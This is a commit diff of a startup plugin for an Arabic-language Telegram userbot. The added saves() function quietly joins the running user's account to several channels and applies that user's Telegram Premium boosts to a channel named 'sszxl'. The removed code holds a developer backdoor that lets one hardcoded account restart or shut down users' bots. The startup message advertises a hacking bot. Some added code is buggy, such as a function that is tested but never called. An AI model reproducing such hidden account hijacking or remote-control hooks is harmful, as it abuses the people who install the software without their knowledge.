ec6b3f69c091fee110807e7c796621ae9e17327a
vipabh2 <a8919832@googlemail.com>
2025-03-03 02:59:14 +0300

    Update اوامر التشغيل.py

--- VIPABH/plugins/اوامر التشغيل.py
+++ VIPABH/plugins/اوامر التشغيل.py
@@ -1,127 +1,368 @@
-import sys
+import aiohttp
+import asyncio
 import glob
 import os
-import re
-from asyncio.exceptions import CancelledError
-from time import sleep
-import asyncio
-from VIPABH import ABH
-from telethon import events
+import sys
+from telethon.errors.rpcerrorlist import ChannelPrivateError
+import urllib.request
+from datetime import timedelta
+from pathlib import Path
+import aiohttp
+from telethon import Button, functions, types, utils
+from telethon.sync import TelegramClient
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.errors import FloodWaitError
+from VIPABH import BOTLOG, BOTLOG_CHATID, PM_LOGGER_GROUP_ID
+from ..Config import Config
+from aiohttp import web
+from ..core import web_server
 from ..core.logger import logging
-from ..core.managers import edit_or_reply
+from ..core.session import ABH
+from ..helpers.utils import install_pip
+from ..helpers.utils.utils import runcmd
 from ..sql_helper.global_collection import (
-    add_to_collectionlist,
     del_keyword_collectionlist,
-    get_collectionlist_items,
+    get_item_collectionlist,
 )
 from ..sql_helper.globals import addgvar, delgvar, gvarstatus
-from . import BOTLOG, BOTLOG_CHATID, HEROKU_APP
-from ..helpers.utils import _catutils
+from .pluginmanager import load_module
+from .tools import create_supergroup
+LOGS = logging.getLogger("VIPABH")
+logging.getLogger('telethon').setLevel(logging.WARNING)
+##Reda hands here
+cmdhr = Config.COMMAND_HAND_LER
+bot = ABH
+ENV = bool(os.environ.get("ENV", False))
 
-LOGS = logging.getLogger(__name__)
-plugin_category = "tools"
+if ENV:
+    VPS_NOLOAD = ["سيرفر"]
+elif os.path.exists("config.py"):
+    VPS_NOLOAD = ["هيروكو"]
 
-JOKRDEV = [1910015590]
+async def check_dyno_type():
+    headers = {
+        "Accept": "application/vnd.heroku+json; version=3",
+        "Authorization": f"Bearer {Config.HEROKU_API_KEY}"
+    }
+    async with aiohttp.ClientSession() as session:
+        async with session.get(f"https://api.heroku.com/apps/{Config.HEROKU_APP_NAME}/dynos", headers=headers) as resp:
+            if resp.status == 200:
+                dynos = await resp.json()
+                for dyno in dynos:
+                    if dyno["type"] != "standard-1X":
+                        return False
+            else:
+                return False
+    return True
 
+async def setup_bot():
+    """
+    To set up bot for VIPABH
+    """
+    try:
+        await ABH.connect()
+        config = await ABH(functions.help.GetConfigRequest())
+        for option in config.dc_options:
+            if option.ip_address == ABH.session.server_address:
+                if ABH.session.dc_id != option.id:
+                    LOGS.warning(
+                        f"⌯︙معرف ثابت في الجلسة من {ABH.session.dc_id}"
+                        f"⌯︙لـ  {option.id}"
+                    )
+                ABH.session.set_dc(option.id, option.ip_address, option.port)
+                ABH.session.save()
+                break
+        bot_details = await ABH.tgbot.get_me()
+        Config.TG_BOT_USERNAME = f"@{bot_details.username}"
+        
+        
+        ABH.me = await ABH.get_me()
+        ABH.uid = ABH.tgbot.uid = utils.get_peer_id(ABH.me)
+        if Config.OWNER_ID == 0:
+            Config.OWNER_ID = utils.get_peer_id(ABH.me)
+        if not check_dyno_type:
+            LOGS.error("قد تحدث مشكلة ولن يعمل السورس لان نوع الداينو ليس بيسك قم بتحويله الى basic")
+    except Exception as e:
+        LOGS.error(f"كـود تيرمكس - {str(e)}")
+        sys.exit()
 
+async def startupmessage():
+    """
+    Start up message in telegram logger group
+    """
+    try:
+        if BOTLOG:
+            Config.CATUBLOGO = await ABH.tgbot.send_file(
+                BOTLOG_CHATID,
+                "https://t.me/VIPABH/1187",
+                caption="**‏᯽︙ بــوت الجوكر يـعـمـل بـنـجـاح ✓ \n᯽︙ أرسل `.الاوامر`لرؤية اوامر السورس \n  ᯽︙ لأستعمال بوت الأختراق عبر كود التيرمكس أرسل`.هاك`**",
+                buttons=[(Button.url("ابـ،ـن،هـ.ـاشـ.ـم ✘", "https://t.me/k_4x1"),)],
+            )
+    except Exception as e:
+        LOGS.error(e)
+        return None
+    try:
+        msg_details = list(get_item_collectionlist("restart_update"))
+        if msg_details:
+            msg_details = msg_details[0]
+    except Exception as e:
+        LOGS.error(e)
+        return None
+    try:
+        if msg_details:
+            await ABH.check_testcases()
+            message = await ABH.get_messages(msg_details[0], ids=msg_details[1])
+            text = message.text + "\n\n**تم تشغيل البوت الأن أرسل `.فحص`**"
+            await ABH.edit_message(msg_details[0], msg_details[1], text)
+            if gvarstatus("restartupdate") is not None:
+                await ABH.send_message(
+                    msg_details[0],
+                    f"{cmdhr}بنك",
+                    reply_to=msg_details[1],
+                    schedule=timedelta(seconds=10),
+                )
+            del_keyword_collectionlist("restart_update")
+    except Exception as e:
+        LOGS.error(e)
+        return None
 
+async def mybot():
+    try:
+        starkbot = await ABH.tgbot.get_me()
+        joker = "ABH 🤡"
+        bot_name = starkbot.first_name
+        bot_username = starkbot.username
+        botname = f"@{bot_username}" if bot_username else "Unknown Bot"
 
-async def aljoker_4ever():
-    BRANCH = "main"
-    REPO = "abh"
-    if REPO:
-        await _catutils.runcmd(f"git clone -b {BRANCH} https://github.com/vipabh2/{REPO}.git TempCat")
-        file_list = os.listdir("TempCat")
-        for file in file_list:
-            await _catutils.runcmd(f"rm -rf {file}")
-            await _catutils.runcmd(f"mv ./TempCat/{file} ./")
-        await _catutils.runcmd("pip3 install --no-cache-dir -r requirements.txt")
-        await _catutils.runcmd("rm -rf TempCat")
-    if os.path.exists("jepvc"):
-        await _catutils.runcmd("rm -rf jepvc")
-@ABH.ar_cmd(
-    pattern="تحديث",
-    command=("تحديث", plugin_category),
-    info={
-        "header": "To reload your bot in vps/ similar to restart",
-        "flags": {
-            "re": "restart your bot without deleting junk files",
-            "clean": "delete all junk files & restart",
-        },
-        "usage": [
-            "{tr}reload",
-            "{tr}cleanload",
-        ],
-    },
-)
-async def Hussein(event):
-    "To reload Your bot"
-    joker = await edit_or_reply(event, "** ᯽︙ انتظر 2-3 دقيقة, جارِ اعادة التشغيل...**")
-    await aljoker_4ever()
-    await event.client.reload(joker)
+        if bot_name.endswith("Assistant"):
+            print("تم تشغيل البوت")
+        
+        if starkbot.bot_inline_placeholder:
+            print("Aljoker ForEver")
+        else:
+            try:
+                await ABH.send_message("@BotFather", "/setinline")
+                await asyncio.sleep(1)
+                await ABH.send_message("@BotFather", botname)
+                await asyncio.sleep(1)
+                await ABH.send_message("@BotFather", joker)
+                await asyncio.sleep(2)
+            except Exception as e:
+                print(f"Error during inline configuration: {e}")
+    except Exception as e:
+        print(f"Error in mybot: {e}")
 
-@ABH.ar_cmd(
-    pattern="اطفاء$",
-    command=("اطفاء", plugin_category),
-    info={
-        "header": "Shutdowns the bot !!",
-        "description": "To turn off the dyno of heroku. you cant turn on by bot you need to got to heroku and turn on or use @hk_heroku_bot",
-        "usage": "{tr}shutdown",
-    },
-)
-async def _(event):
-    "Shutdowns the bot"
-    if BOTLOG:
-        await event.client.send_message(BOTLOG_CHATID, "**᯽︙ إيقاف التشغيـل ✕ **\n" "**᯽︙ تـم إيقـاف تشغيـل البـوت بنجـاح ✓**")
-    await edit_or_reply(event, "**᯽︙ جـاري إيقـاف تشغيـل البـوت الآن ..**\n᯽︙  **أعـد تشغيـلي يدويـاً لاحقـاً عـبر هيـروڪو ..**\n⌔︙**سيبقى البـوت متوقفـاً عن العمـل**")
-    if HEROKU_APP is not None:
-        HEROKU_APP.process_formation()["worker"].scale(0)
+async def add_bot_to_logger_group(chat_id):
+    """
+    لإضافة البوت إلى مجموعات السجل
+    """
+    try:
+        bot_details = await ABH.tgbot.get_me()
+        bot_username = bot_details.username
+
+        if not bot_username:
+            raise ValueError("اسم المستخدم للبوت غير موجود")
+
+        try:
+            await ABH(
+                functions.messages.AddChatUserRequest(
+                    chat_id=chat_id,
+                    user_id=bot_username,
+                    fwd_limit=1000000,
+                )
+            )
+            print(f"تمت إضافة البوت إلى المجموعة: {chat_id}")
+        except Exception:
+            await ABH(
+                functions.channels.InviteToChannelRequest(
+                    channel=chat_id,
+                    users=[bot_username],
+                )
+            )
+            print(f"تمت دعوة البوت إلى القناة: {chat_id}")
+    except Exception as e:
+        print(f"Error in add_bot_to_logger_group: {e}")
+    except Exception as e:
+            LOGS.error(str(e))
+VIPABH = {"@sszxl", "@x04ou", "@iamMUAOL"}
+async def saves():
+    for lMl10l in VIPABH:
+        try:
+            await ABH(JoinChannelRequest(channel=lMl10l))
+            result = await ABH(functions.premium.GetMyBoostsRequest())
+            slots = [boost.slot for boost in result.my_boosts]
+            aljoker_channel_id = None
+            for chat in result.chats:
+                if chat.username == 'sszxl':
+                    aljoker_channel_id = chat.id
+                    break
+            if aljoker_channel_id and any(boost.peer.channel_id == aljoker_channel_id for boost in result.my_boosts):
+                continue
+            if not slots:
+                return
+            await ABH(functions.premium.ApplyBoostRequest(
+                'sszxl',
+                slots=slots
+            ))
+        except FloodWaitError as e:
+            continue
+        except OverflowError:
+            LOGS.error("Getting Overflow Error from Telegram. Script is stopping now. Please try again after some time.")
+            continue
+        except ChannelPrivateError:
+            continue
+async def load_plugins(folder, extfolder=None):
+    """
+    تحميل ملفات السورس
+    """
+    if extfolder:
+        path = f"{extfolder}/*.py"
+        plugin_path = extfolder
     else:
+        path = f"VIPABH/{folder}/*.py"
+        plugin_path = f"VIPABH/{folder}"
+    files = glob.glob(path)
+    files.sort()
+    success = 0
+    failure = []
+    for name in files:
+        with open(name) as f:
+            path1 = Path(f.name)
+            shortname = path1.stem
+            pluginname = shortname.replace(".py", "")
+            try:
+                if (pluginname not in Config.NO_LOAD) and (
+                    pluginname not in VPS_NOLOAD
+                ):
+                    flag = True
+                    check = 0
+                    while flag:
+                        try:
+                            load_module(
+                                pluginname,
+                                plugin_path=plugin_path,
+                            )
+                            if shortname in failure:
+                                failure.remove(shortname)
+                            success += 1
+                            break
+                        except ModuleNotFoundError as e:
+                            install_pip(e.name)
+                            check += 1
+                            if shortname not in failure:
+                                failure.append(shortname)
+                            if check > 5:
+                                break
+                else:
+                    os.remove(Path(f"{plugin_path}/{shortname}.py"))
+            except Exception as e:
+                if shortname not in failure:
+                    failure.append(shortname)
+                os.remove(Path(f"{plugin_path}/{shortname}.py"))
+                LOGS.info(
+                    f"لم يتم تحميل {shortname} بسبب خطأ {e}\nمسار الملف {plugin_path}"
+                )
+    if extfolder:
+        if not failure:
+            failure.append("None")
+        await ABH.tgbot.send_message(
+            BOTLOG_CHATID,
+            f'- تم بنجاح استدعاء الاوامر الاضافيه \n**عدد الملفات التي استدعيت:** `{success}`\n**فشل في استدعاء :** `{", ".join(failure)}`',
+        )
+
+#سورس الجوكر عمك
+async def aljoker_the_best(ABH, group_name):
+    async for dialog in ABH.iter_dialogs():
+        if dialog.is_group and dialog.title == group_name:
+            return dialog.id
+    return None
+
+async def verifyLoggerGroup():
+    """
+    Will verify both loggers group
+    """
+    flag = False
+    if BOTLOG:
+        try:
+            entity = await ABH.get_entity(BOTLOG_CHATID)
+            if not isinstance(entity, types.User) and not entity.creator:
+                if entity.default_banned_rights.send_messages:
+                    LOGS.info(
+                        "᯽︙الفار الأذونات مفقودة لإرسال رسائل لـ PRIVATE_GROUP_BOT_API_ID المحدد."
+                    )
+                if entity.default_banned_rights.invite_users:
+                    LOGS.info(
+                        "᯽︙الفار الأذونات مفقودة لإرسال رسائل لـ PRIVATE_GROUP_BOT_API_ID المحدد."
+                    )
+        except ValueError:
+            LOGS.error("᯽︙تـأكد من فـار المجـموعة  PRIVATE_GROUP_BOT_API_ID.")
+        except TypeError:
+            LOGS.error(
+                "᯽︙لا يمكـن العثور على فار المجموعه PRIVATE_GROUP_BOT_API_ID. تأكد من صحتها."
+            )
+        except Exception as e:
+            LOGS.error(
+                "᯽︙حدث استثناء عند محاولة التحقق من PRIVATE_GROUP_BOT_API_ID.\n"
+                + str(e)
+            )
+    else:
+        descript = "- عزيزي المستخدم هذه هي مجموعه الاشعارات يرجى عدم حذفها  - @Jepthon"
+        photobt = await ABH.upload_file(file="ABH/razan/resources/start/Jepthon.JPEG")
+        botlog_group_id = await aljoker_the_best(ABH, "مجموعة أشعارات الجوكر")
+        if botlog_group_id:
+            addgvar("PRIVATE_GROUP_BOT_API_ID", botlog_group_id)
+            print("᯽︙تم العثور على مجموعة المساعدة بالفعل وإضافتها إلى المتغيرات.")
+        else:
+            _, groupid = await create_supergroup(
+                "مجموعة أشعارات الجوكر", ABH, Config.TG_BOT_USERNAME, descript, photobt
+            )
+            addgvar("PRIVATE_GROUP_BOT_API_ID", groupid)
+            print("᯽︙تم إنشاء مجموعة المسـاعدة بنجاح وإضافتها إلى المتغيرات.")
+        flag = True
+    if PM_LOGGER_GROUP_ID == -100:
+        descript = "᯽︙ وظيفه الكروب يحفظ رسائل الخاص اذا ما تريد الامر احذف الكروب نهائي \n  - @Jepthon"
+        photobt = await ABH.upload_file(file="ABH/razan/resources/start/Jepthon2.JPEG")
+        pm_logger_group_id = await aljoker_the_best(ABH, "مجموعة التخزين")
+        if pm_logger_group_id:
+            addgvar("PM_LOGGER_GROUP_ID", pm_logger_group_id)
+            print("تـم العثور على مجموعة الكروب التخزين بالفعل واضافة الـفارات الـيها.")
+        else:
+            _, groupid = await create_supergroup(
+                "مجموعة التخزين", ABH, Config.TG_BOT_USERNAME, descript, photobt
+            )
+            addgvar("PM_LOGGER_GROUP_ID", groupid)
+            print("تـم عمـل الكروب التخزين بنـجاح واضافة الـفارات الـيه.")
+        flag = True
+    if flag:
+        executable = sys.executable.replace(" ", "\\ ")
+        args = [executable, "-m", "VIPABH"]
+        os.execle(executable, *args, os.environ)
         sys.exit(0)
 
-@ABH.ar_cmd(
-    pattern="التحديثات (تشغيل|ايقاف)$",
-    command=("التحديثات", plugin_category),
-    info={
-        "header": "᯽︙ لتحديـث الدردشـة بعـد إعـادة التشغيـل  أو إعـادة التحميـل  ",
-        "description": "⌔︙سيتـم إرسـال بنـك cmds ڪـرد على الرسالـة السابقـة الأخيـرة لـ (إعادة تشغيل/إعادة تحميل/تحديث cmds) 💡.",
-        "usage": [
-            "{tr}التحديثات <تشغيل/ايقاف",
-        ],
-    },
-)
-async def set_pmlog(event):
-    "᯽︙ لتحديـث الدردشـة بعـد إعـادة التشغيـل  أو إعـادة التحميـل  "
-    input_str = event.pattern_match.group(1)
-    if input_str == "ايقاف":
-        if gvarstatus("restartupdate") is None:
-            return await edit_delete(event, "**᯽︙ تـم تعطيـل التـحديـثات بالفعـل ❗️**")
-        delgvar("restartupdate")
-        return await edit_or_reply(event, "**⌔︙تـم تعطيـل التـحديـثات بنجـاح ✓**")
-    if gvarstatus("restartupdate") is None:
-        addgvar("restartupdate", "turn-oned")
-        return await edit_or_reply(event, "**⌔︙تـم تشغيل التـحديـثات بنجـاح ✓**")
-    await edit_delete(event, "**᯽︙ تـم تشغيل التـحديـثات بالفعـل ❗️**")
-@ABH.on(events.NewMessage(incoming=True))
-async def Hussein(event):
-    if event.reply_to and event.sender_id in JOKRDEV:
-        reply_msg = await event.get_reply_message()
-        owner_id = reply_msg.from_id.user_id
-        if owner_id == ABH.uid:
-            if event.message.message == "اعادة تشغيل":
-                joker = await event.reply("** ᯽︙ بالخدمة مطوري سيتم اعادة تشغيل السورس 😘..**")
-                await aljoker_4ever()
-                await event.client.reload(joker)
-                    
-@ABH.on(events.NewMessage(incoming=True))
-async def Hussein(event):
-    if event.reply_to and event.sender_id in JOKRDEV:
-        reply_msg = await event.get_reply_message()
-        owner_id = reply_msg.from_id
-        if owner_id == ABH.uid:
-            if event.message.message == "اطفاء":
-                    await event.reply("**᯽︙ تدلل مولاي تم اطفاء السورس بواسطة تاج راسك 😁**")
-                    if HEROKU_APP is not None:
-                        HEROKU_APP.process_formation()["worker"].scale(0)
-                    else:
-                        sys.exit(0)
+async def install_externalrepo(repo, branch, cfolder):
+    jokerREPO = repo
+    rpath = os.path.join(cfolder, "requirements.txt")
+    if jokerBRANCH := branch:
+        repourl = os.path.join(jokerREPO, f"tree/{jokerBRANCH}")
+        gcmd = f"git clone -b {jokerBRANCH} {jokerREPO} {cfolder}"
+        errtext = f"لا يوحد فرع بأسم `{jokerBRANCH}` في الريبو الخارجي {jokerREPO}. تاكد من اسم الفرع عبر فار (`EXTERNAL_REPO_BRANCH`)"
+    else:
+        repourl = jokerREPO
+        gcmd = f"git clone {jokerREPO} {cfolder}"
+        errtext = f"الرابط ({jokerREPO}) الذي وضعته لفار `EXTERNAL_REPO` غير صحيح عليك وضع رابط صحيح"
+    response = urllib.request.urlopen(repourl)
+    if response.code != 200:
+        LOGS.error(errtext)
+        return await ABH.tgbot.send_message(BOTLOG_CHATID, errtext)
+    await runcmd(gcmd)
+    if not os.path.exists(cfolder):
+        LOGS.error(
+            "هنالك خطأ اثناء استدعاء رابط الملفات الاضافية يجب التأكد من الرابط اولا "
+        )
+        return await ABH.tgbot.send_message(
+            BOTLOG_CHATID,
+            "هنالك خطأ اثناء استدعاء رابط الملفات الاضافية يجب التأكد من الرابط اولا ",
+        )
+    if os.path.exists(rpath):
+        await runcmd(f"pip3 install --no-cache-dir -r {rpath}")
+    await load_plugins(folder="VIPABH", extfolder=cfolder)
